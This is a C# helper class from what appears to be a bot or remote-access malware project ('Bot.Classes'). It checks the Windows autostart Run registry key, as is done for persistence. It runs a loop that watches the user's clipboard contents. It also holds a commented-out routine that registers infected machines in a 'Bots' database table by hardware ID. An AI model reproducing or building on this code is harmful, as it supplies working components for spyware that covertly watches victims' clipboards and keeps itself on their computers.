﻿using System.Reflection;
using System.Data.SqlClient;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Text;

namespace Bot.Classes
{
    internal class Misc
    {
        public static string getFileLocation()
        {
            string loc = Assembly.GetExecutingAssembly().Location;
            if (loc == "" || loc == null)
            {
                loc = Assembly.GetEntryAssembly().Location;
            }
            return loc;
        }

        public static string ConvertStringArrayToString(string[] array)
        {
            StringBuilder builder = new StringBuilder();
            foreach (string value in array)
            {
                builder.Append(value);
                builder.Append(';');
            }
            return builder.ToString();
        }

        public static bool getKey(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

       


        public static string GetClipboardText()
        {
            string result = "";

            Thread thread = new Thread(() => result = Clipboard.GetText());
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();

            return result;
        }

        public static void clip()
        {
            string last = "";
            do
            {
                if (last != GetClipboardText())
                {
                    Console.WriteLine(GetClipboardText());
                    last = GetClipboardText();
                }
            } while (Program.clipon);
        }

        //public static bool Registered()
        //{
        //    using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
        //    {
        //        conn.Open();
        //        using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE HWID = @HWID ", conn))
        //        {
        //            cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
        //            if((int)cmd.ExecuteScalar() > 0)
        //            {
        //                return true;
        //            }
        //            else
        //            {
        //                return false;
        //            }
        //        }
        //    }
        //}
    }
}